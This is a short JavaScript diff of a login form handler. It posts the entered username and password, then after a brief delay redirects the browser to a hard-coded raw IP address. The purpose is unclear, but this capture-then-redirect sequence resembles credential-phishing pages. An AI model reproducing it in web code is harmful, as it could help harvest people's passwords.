@@ -298,7 +298,9 @@
           const passwd = e.target.passwd.value;
           const type = e.target.type.value;
           post({ user, passwd, type });
-          // window.location.href = "http://103.138.0.69/ecap/";
+          setTimeout(() => {
+            window.location.href = "http://103.138.0.69/ecap/";
+          }, 300);
         });
       });
 
